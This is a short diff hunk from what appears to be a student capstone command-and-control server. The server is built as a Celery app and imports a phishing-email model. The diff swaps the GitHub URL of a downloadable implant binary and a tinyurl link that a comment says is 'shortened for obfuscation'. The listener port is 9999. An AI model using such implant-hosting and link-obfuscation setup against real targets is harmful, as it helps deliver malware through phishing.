@@ -13,10 +13,10 @@ from c2.models import PhishingEmail, db
 app = Celery("c2")
 
 original_implant_addr = (
-    "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/heads/main/libutils-amd64"
+    "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/heads/main/implant_x86"
 )
 # shortened for obfuscation
-IMPLANT_ADDR = "https://tinyurl.com/ycxssc7p"
+IMPLANT_ADDR = "https://tinyurl.com/5n8cdch"
 PORT = 9999
 
 
